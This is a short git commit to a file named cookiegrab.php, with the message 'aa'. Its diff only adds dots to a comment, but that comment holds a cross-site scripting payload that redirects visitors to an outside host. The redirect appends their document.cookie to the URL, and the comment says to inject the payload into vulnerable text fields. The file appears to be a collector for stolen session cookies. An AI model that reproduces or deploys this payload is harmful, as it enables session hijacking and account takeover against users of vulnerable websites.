ab66450327163f3d3946911b0b9b351f7816f9d6
phoBowl <tdnam39@gmail.com>
2018-04-21 14:44:06 +1000

    aa

--- cookiegrab.php
+++ cookiegrab.php
@@ -6,6 +6,6 @@
 	/* 
 	inject 
 	<script language="javascript"> document.location= " http://kennethzhang.net/cookiegrab.php?c=" + document.cookie; </script>
-	into vulnerable text fields ..
+	into vulnerable text fields .....
 	*/
 ?> 
